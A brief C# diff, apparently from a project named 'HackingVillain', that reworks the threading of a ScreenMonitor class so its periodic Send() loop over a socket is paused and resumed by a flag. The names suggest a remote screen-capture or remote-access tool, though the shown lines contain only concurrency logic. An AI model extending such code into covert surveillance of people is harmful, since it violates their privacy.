@@ -16,6 +16,7 @@ namespace HackingVillain
     {
         ISocket _client;
         Thread t;
+        bool _started = false;
         public ScreenMonitor(ISocket sock)
         {
             _client = sock;
@@ -24,10 +25,13 @@ namespace HackingVillain
             {
                 while(true)
                 {
+                    while (!_started)
+                        Thread.Sleep(500);
                     Send();
                     Thread.Sleep(1000);
                 }
             });
+            t.Start();
         }
 
         ~ScreenMonitor()
@@ -37,12 +41,12 @@ namespace HackingVillain
 
         public void Start()
         {
-            t.Start();
+            _started = true;
         }
 
         public void Stop()
         {
-            t.Abort();
+            _started = false;
         }
 
         public void Send()
